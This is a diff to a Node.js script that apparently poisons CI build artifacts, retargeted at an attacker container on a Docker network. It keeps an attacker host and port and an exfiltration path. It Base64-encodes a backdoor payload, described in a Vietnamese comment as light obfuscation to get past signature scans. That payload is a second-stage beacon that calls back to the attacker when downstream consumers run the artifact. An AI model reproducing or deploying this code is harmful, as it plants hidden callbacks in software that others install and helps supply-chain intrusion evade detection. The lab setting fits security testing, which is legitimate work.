@@ -22,7 +22,7 @@ const path = require("path");
 const http = require("http");
 
 // ─── Config ────────────────────────────────────────────────────────────────
-const ATTACKER_HOST = "192.168.157.134";
+const ATTACKER_HOST = "172.30.0.20"; // IP attacker container (Docker bridge network)
 const ATTACKER_PORT = 8080;
 const EXFIL_PATH = "/exfil/artifact-poison-confirm";
 
@@ -42,9 +42,9 @@ const POISONED_FLAG = path.join(ARTIFACT_DIR, "ci-injected-marker.txt");
  * String được obfuscate nhẹ bằng Base64 để qua signature scan.
  */
 const BACKDOOR_PAYLOAD_B64 = Buffer.from(
-  // Decoded: '(function(){require("http").get("http://192.168.157.134:8080/beacon")})()'
+  // Decoded: '(function(){require("http").get("http://172.30.0.20:8080/beacon")})()'
   // Đây là second-stage beacon — khi consumer chạy artifact, nó gọi về attacker
-  '(function(){require("http").get("http://192.168.157.134:8080/beacon")})()'
+  '(function(){require("http").get("http://172.30.0.20:8080/beacon")})()'
 ).toString("base64");
 
 const POISON_COMMENT = `
